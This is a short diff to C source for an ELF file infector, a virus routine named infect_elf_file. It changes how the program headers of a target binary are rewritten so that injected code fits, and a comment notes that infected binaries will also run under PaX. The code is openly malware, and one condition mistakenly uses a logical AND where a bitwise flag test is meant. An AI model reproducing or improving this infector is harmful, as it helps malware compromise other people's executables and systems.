@@ -417,6 +417,7 @@ Elf64_Addr infect_elf_file(elfbin_t *self, elfbin_t *target)
 	uint8_t *mem;
 	int fd;
 	int text_found = 0, i;
+	int infext_PF_R=1;
 	Elf64_Addr orig_entry_point;
 	Elf64_Addr origText;
 	Elf64_Addr new_base;
@@ -465,8 +466,10 @@ Elf64_Addr infect_elf_file(elfbin_t *self, elfbin_t *target)
 		} else {
 			if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset && (phdr[i].p_flags & PF_W))
 				phdr[i].p_align = 0x1000; // also to  allow infected bins to work with PaX :)
-			if (phdr[i].p_type == PT_LOAD && phdr[i].p_flags && PF_R){
-				phdr[i].p_offset += paddingSize;
+			if (phdr[i].p_type == PT_LOAD && phdr[i].p_flags && PF_R && infext_PF_R){
+				phdr[i].p_vaddr -= paddingSize;
+				phdr[i].p_paddr -= paddingSize;
+				infext_PF_R=0;
 			}
 		}
 	}
